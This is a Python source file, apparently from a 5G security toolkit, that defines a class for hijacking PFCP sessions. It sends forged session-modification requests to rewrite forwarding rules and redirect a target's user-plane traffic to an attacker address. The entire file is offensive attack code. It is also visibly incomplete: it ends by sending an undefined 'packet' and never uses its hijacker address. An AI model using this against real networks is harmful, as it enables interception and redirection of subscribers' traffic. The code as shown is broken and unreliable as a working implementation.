from pfcpToolkit import PFCPToolkit
import random, time, threading, ipaddress
from scapy.all import send, sr1

from scapy.contrib.pfcp import *

from utils.handleParams import HandleParams
from utils.logger import Log


class PFCPHijack:
    def __init__(self, src_addr, dest_addr, src_port, dest_port, seid, verbose=False):
        self.src_addr = src_addr
        self.dest_addr = dest_addr
        self.src_port = src_port
        self.dest_port = dest_port
        self.seid = seid
        self.paramsHandler = HandleParams()
        self.class_prefix="[PFCP-HIJACK]"
        self.paramsHandler.basePrefix(self.class_prefix)
        self.verbose = verbose

    def set_verbose(self, verbose):
        """
        Set the verbosity level for logging.
        """
        self.verbose = verbose
        
    
    def Start_PFCP_hijack_far_manipulation(self,hijacker_addr,  src_addr=None, dest_addr=None, src_port=None, dest_port=None, seid=None):
        """
        Start PFCP hijack far manipulation
        """
        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        seid = seid or self.seid
        
        self.paramsHandler.check_parameters({
            "src_addr": src_addr,
            "dest_addr": dest_addr,
            "src_port": src_port,
            "dest_port": dest_port,
            "seid": seid
        }, "[Start_PFCP_hijack_far_manipulation]")
                
        PFCPToolkit_obj = PFCPToolkit(
            src_addr=src_addr or self.src_addr,
            dest_addr=dest_addr or self.dest_addr,
            src_port=src_port or self.src_port,
            dest_port=dest_port or self.dest_port,
            seid=seid or self.seid
        )
        PFCPToolkit_obj.verbose(self.verbose)
        
        PFCPToolkit_obj.Send_PFCP_session_modification_req()
        
        # Send the packet
        send(packet)